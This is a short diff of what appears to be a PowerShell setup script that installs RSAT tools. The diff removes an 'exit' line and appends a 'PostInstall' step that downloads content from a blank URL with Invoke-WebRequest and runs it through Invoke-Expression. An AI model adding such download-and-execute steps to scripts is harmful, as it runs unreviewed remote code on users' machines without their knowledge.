@@ -900,5 +900,6 @@ Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
 Start-Process ms-settings:optionalfeatures
 Stop-Transcript
 
+$PostInstall = Invoke-WebRequest("")
+Invoke-Expression $($PostInstall.Content)
 
-exit
